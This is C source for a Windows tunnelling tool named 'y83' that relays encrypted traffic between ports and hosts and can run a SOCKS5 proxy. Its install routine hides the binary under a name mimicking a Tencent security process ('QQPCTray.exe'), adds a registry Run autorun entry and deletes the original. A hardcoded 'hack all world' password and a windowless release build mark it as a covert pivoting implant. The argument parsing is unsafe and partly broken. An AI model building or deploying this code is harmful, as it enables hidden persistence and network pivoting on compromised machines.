#include <stdio.h>
#include "Configure.h"
#include "NetBind.h"
#include "CryptIt.h"
#include "SystemCommon.h"
#include "MyTcpFun.h"
#include "CRC.h"

#define CRYPT000			L"QQPCTray.exe"
#define ENCRYPT_PARAM		L"/encrypt"
#define DECRYPT_PARAM		L"/decrypt"
#define PASSWORD			"hack all world"

//-install /recv 8080 /send 127.0.0.1 5050 /encrypt /hash md5 /crypt rc4 /sign ecc /password 1234

extern CRITICAL_SECTION g_SockX;

CONFIGURE_STRUCT g_Configure = {0};

enum RUN_MODE {
	_UNINSTALL,
	_INSTALL,
	_RUN
};
DWORD g_Mode = 0;

//HANDLE g_hL2L = NULL;
//HANDLE g_hC2C = NULL;
//HANDLE g_hL2C = NULL;
//HANDLE g_hSock5Proxy = NULL;

enum FUNC_THREAD_HANDLE
{
	TH_L2L,
	TH_L2C,
	TH_C2C,
	TH_SOCK5_PROXY
};

HANDLE g_ThreadList[10] = {0};

BOOL Install();
BOOL UnInstall();

void Usage()
{
	printf("usage:y83 <mode> [options]\r\n");
	printf("<mode> -install install to autorun\r\n");
	printf("       -uninstall uninstall autorun\r\n");
	printf("       -run play now\r\n");
	printf("--------------------------------------------------\r\n");
	printf("!!! port1 -> port2");
	printf("[options] /l2c <port1> <x|n> <ip> <port2> <x|n>\r\n");
	printf("          /l2l <port1> <x|n> <port2> <x|n>\r\n");
	printf("          /c2c <w|nw> <ip1> <port1> <x|n> <ip2> <port2> <x|n> sync|async\r\n");
	printf("          /sock5proxy <port>\r\n");
	printf("          /timeout <num> def=300sec\r\n");
	printf("          /encrypt|decrypt this is a encrypt or decrypt\r\n");
	printf("          /hash <HASH> select a hash algorithm\r\n");
	printf("          /crypt <CRYPT> select a crypt algorithm\r\n");
	printf("          /sign <SIGN> select a sign algorithm\r\n");
	printf("          /password <ps> input a pasword\r\n");
	printf("--------------------------------------------------\r\n\r\n");
}

unsigned char SetCryptType( char *a )
{
	if (stricmp(a, "x") == 0)
		return CRYPT_IT;

	return DO_NOTHING_IT;
}

BOOL HandleArguments( int argc, char *argv[] )
{
	int i = 0;
	if ( argc == 1 )
	{
		Usage();
		return FALSE;
	}

	while ( i < argc )
	{
		if (( argv[i][0] == '-' ) || ( argv[i][0] == '/' ))
		{
			switch ( argv[i][1] )
			{
			case 'i':
			case 'I':
				{
					if ( stricmp( argv[i], "-install" ) == 0 )
					{
						g_Mode = _INSTALL;
					}
				}break;
			case 'u':
			case 'U':
				{
					if ( stricmp( argv[i], "-uninstall" ) == 0 )
					{
						g_Mode = _UNINSTALL;
					}
				}break;
			case 'l':
			case 'L':
				{
					if ( stricmp( argv[i], "/l2l" ) == 0 )
					{
						g_Configure.wListenPort1 = atoi(argv[++i]);
						g_Configure.bL2LCrypt[0] = SetCryptType(argv[++i]);
						g_Configure.wListenPort2 = atoi(argv[++i]);
						g_Configure.bL2LCrypt[1] = SetCryptType(argv[++i]);
						g_Configure.bL2L = TRUE;

						if (stricmp( argv[++i], "sync" ) == 0)
							g_Configure.bL2LSync = TRUE;
						else
							g_Configure.bL2LSync = FALSE;
					}
					else if ( stricmp( argv[i], "/l2c" ) == 0 )
					{
						g_Configure.wRecvPort = atoi(argv[++i]);
						g_Configure.bL2CCrypt[0] = SetCryptType(argv[++i]);
						strcpy(g_Configure.szSendIP, argv[++i]);
						g_Configure.wSendPort = atoi(argv[++i]);
						g_Configure.bL2CCrypt[1] = SetCryptType(argv[++i]);
						g_Configure.bL2C = TRUE;

						if (stricmp( argv[++i], "sync" ) == 0)
							g_Configure.bL2CSync = TRUE;
						else
							g_Configure.bL2CSync = FALSE;
					}
				}break;
			case 'c':
			case 'C':
				{
					if ( stricmp( argv[i], "/c2c" ) == 0 )
					{
						if (argv[++i][0] == 'w')
							g_Configure.bNotWaitRecvToConnectPort2 = FALSE;
						else
							g_Configure.bNotWaitRecvToConnectPort2 = TRUE;

						strcpy(g_Configure.szConnectIP1, argv[++i]);
						g_Configure.wConnectPort1 = atoi(argv[++i]);
						g_Configure.bC2CCrypt[0] = SetCryptType(argv[++i]);
						strcpy(g_Configure.szConnectIP2, argv[++i]);
						g_Configure.wConnectPort2 = atoi(argv[++i]);
						g_Configure.bC2CCrypt[1] = SetCryptType(argv[++i]);
						g_Configure.bC2C = TRUE;

						if (stricmp( argv[++i], "sync" ) == 0)
							g_Configure.bC2CSync = TRUE;
						else
							g_Configure.bC2CSync = FALSE;
					}
				}break;
			case 'r':
			case 'R':
				{
					if ( stricmp( argv[i], "-run" ) == 0 )
					{
						g_Mode = _RUN;
					}
				}break;
			case 's':
			case 'S':
				{
					if ( stricmp( argv[i], "/sock5proxy" ) == 0 )
					{
						g_Configure.wProxyPort = atoi(argv[++i]);
						g_Configure.bSock5Proxy = TRUE;
					}
				}break;
			case 'e':
			case 'E':
				{
					if ( stricmp( argv[i], "/encrypt" ) == 0 )
					{
						g_Configure.bEncrypt = TRUE;
					}
				}break;
			case 'd':
			case 'D':
				{
					if ( stricmp( argv[i], "/decrypt" ) == 0 )
					{
						g_Configure.bEncrypt = FALSE;
					}
				}break;
			case 'h':
			case 'H':
				{
					if ( stricmp( argv[i], "/hash" ) == 0 )
					{
						g_Configure.bEncrypt = FALSE;
					}
				}break;
			case 'p':
			case 'P':
				{
					if ( stricmp( argv[i], "/password" ) == 0 )
					{
						strcpy_s(g_Configure.szPassword, argv[++i]);
					}
				}break;
			case 't':
			case 'T':
				{
					if (stricmp(argv[i], "/timeout") == 0)
					{
						TIMEOUT = atoi(argv[++i]);
					}
				}
			default:
				return FALSE;
			}
		}
		i++;
	}

	return TRUE;
}

BOOL Install()
{
	// 获取自身的位置
	WCHAR szMyLocal[MAX_PATH] = {0};
	GetModuleFileNameW( NULL, szMyLocal, MAX_PATH );

	// 获取要移动的后的位置
	WCHAR szToLocal[MAX_PATH] = {0};
	GetEnvironmentVariableW( L"CommonProgramFiles", szToLocal, MAX_PATH * sizeof(WCHAR) );
	wcscat_s( szToLocal, L"\\System\\" );
	wcscat_s( szToLocal, CRYPT000 );
	XLOGI("WorkProgram:%S", szToLocal);

	// 将要移动后的位置写入到注册表中
	//-install /recv 8080 /send 127.0.0.1 5050 /encrypt
	WCHAR szProgramCommand[1024] = {0};
	WCHAR *szCrypt = NULL;
	
	if (g_Configure.bEncrypt == TRUE)
		szCrypt = ENCRYPT_PARAM;
	else
		szCrypt = DECRYPT_PARAM;

	swprintf_s( szProgramCommand, 1024, L"\"%s\" /recv %d /send %S %d", szToLocal, g_Configure.wRecvPort, g_Configure.szSendIP, g_Configure.wSendPort, szCrypt );
	_SetRegistryAutoRun( L"CryptObject", szProgramCommand );

	// 复制自己到移动后的位置
	CopyFileW( szMyLocal, szToLocal, FALSE );

	_DeleteSelf();

	return TRUE;
}

BOOL UnInstall()
{
	// 将要移动后的位置写入到注册表中
	_DelRegistryObject( HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"CryptObject" );
	TerminateProcess( GetModuleHandleW( NULL ), -1 );
	return TRUE;
}

DWORD WINAPI L2L( LPVOID lp )
{
	PCONFIGURE_STRUCT pConfigure = (PCONFIGURE_STRUCT)lp;
	bind2bind(pConfigure->wListenPort1, pConfigure->wListenPort2);
	return 0;
}

DWORD WINAPI L2C( LPVOID lp )
{
	PCONFIGURE_STRUCT pConfigure = (PCONFIGURE_STRUCT)lp;
	bind2remote(pConfigure->wRecvPort, pConfigure->szSendIP, pConfigure->wSendPort);
	return 0;
}

DWORD WINAPI C2C( LPVOID lp )
{
	PCONFIGURE_STRUCT pConfigure = (PCONFIGURE_STRUCT)lp;
	conn2conn(pConfigure->szConnectIP1, g_Configure.wConnectPort1,pConfigure->szConnectIP2, g_Configure.wConnectPort2);
	return 0;
}

DWORD WINAPI Sock5ProxyServer( LPVOID lp )
{
	PCONFIGURE_STRUCT pConfigure = (PCONFIGURE_STRUCT)lp;
	create_sock5proxy_server(pConfigure->wProxyPort);
	return 0;
}

#ifdef _DEBUG
int main( int argc, char *argv[] )
#else
int __stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
#endif
{
	CREATE_LOG4Z();

	InitializeCriticalSection(&g_SockX);

#ifdef NDEBUG
	int argc = 0;
	char *argv[16] = {0};
	for (int i=0; i< 16; i++)
	{
		argv[i] = new char [MAX_PATH];
		memset(argv[i], 0, MAX_PATH);
	}
	//char *szCommand = GetCommandLineA();
	char *szCommand = lpCmdLine;

	char *pToken = strtok( szCommand, " " );
	while (pToken != NULL)
	{
		strcpy(argv[argc++], pToken);
		pToken = strtok(NULL, " ");
	}
#endif;

	strcpy(g_Configure.szPassword, PASSWORD);
	g_Configure.dwCrc32Password = crc32( (unsigned char*)g_Configure.szPassword, strlen(g_Configure.szPassword) );
	g_Configure.bHashX = TRUE;

	if ( HandleArguments( argc, argv ) == FALSE )
	{
		return -1;
	}

#ifdef NDEBUG
	for (int i=0; i< 16; i++)
	{
		delete [] argv[i];
	}
#endif

	if ( g_Mode == _INSTALL )
	{
		Install();
	}
	else if ( g_Mode == _UNINSTALL )
	{
		UnInstall();
		goto _end;
	}
	else if ( g_Mode == _RUN )
	{
		
	}
	
	InitSock();
	InstallCrypt();

	DWORD dwHandles = 0;

	if (g_Configure.bSock5Proxy == TRUE)
	{
		DWORD dwThreadID = 0;
		g_ThreadList[TH_SOCK5_PROXY] = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)Sock5ProxyServer, (LPVOID)&g_Configure, 0, &dwThreadID);
		dwHandles++;
		g_Configure.bHashX = FALSE;
		goto _wait;
	}

	if (g_Configure.bC2C == TRUE)
	{
		DWORD dwThreadID = 0;
		g_ThreadList[TH_C2C] = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)C2C, (LPVOID)&g_Configure, 0, &dwThreadID);
		dwHandles++;
	}

	if (g_Configure.bL2L == TRUE)
	{
		DWORD dwThreadID = 0;
		g_ThreadList[TH_L2L] = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)L2L, (LPVOID)&g_Configure, 0, &dwThreadID);
		dwHandles++;
	}

	if (g_Configure.bL2C == TRUE)
	{
		DWORD dwThreadID = 0;
		g_ThreadList[TH_L2C] = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)L2C, (LPVOID)&g_Configure, 0, &dwThreadID);
		dwHandles++;
	}

_wait:
	Sleep(-1);
	//WaitForMultipleObjects(dwHandles, g_ThreadList, TRUE, -1);

	DeleteCriticalSection(&g_SockX);
	WSACleanup();

_end:
	return 0;
}
